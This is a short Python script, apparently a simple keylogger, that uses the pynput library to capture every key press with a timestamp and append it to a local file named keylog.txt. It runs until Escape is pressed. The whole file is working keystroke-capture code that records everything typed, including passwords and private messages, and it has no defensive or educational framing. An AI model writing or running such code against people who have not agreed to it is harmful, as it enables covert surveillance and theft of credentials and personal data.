import pynput.keyboard as keyboard
import datetime

log_file = "keylog.txt"


def on_press(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        entry = f"{timestamp}: {key.char}"
    except:
        entry = f"{timestamp}: {key}"

    with open(log_file, "a") as f: #appende
        f.write(entry + "\n")

print("Keylogger running. ESC = stop.")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


listener = keyboard.Listener(on_press=on_press, 
                             on_release=on_release)
listener.start()
listener.join()

